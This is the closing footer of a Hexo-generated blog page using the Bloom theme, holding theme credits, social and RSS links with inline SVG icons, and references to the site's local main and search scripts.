          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
        </span>
      
      
        <span class="theme-info">
          Theme <a href="https://github.com/yourname/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
        </span>
      
    </div>
  </div>

  
    <div class="footer-social">
      
        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
        </a>
      
      
        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        </a>
      
      
      
        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
        </a>
      
      
        <a href="/atom.xml" class="social-link" aria-label="RSS">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
        </a>
      
    </div>
  
</footer>

  </div>

  <!-- Main Script -->

<script src="/js/main.js"></script>


<!-- Search -->


<script src="/js/search.js"></script>



<!-- Baidu Analytics -->


</body>
</html>
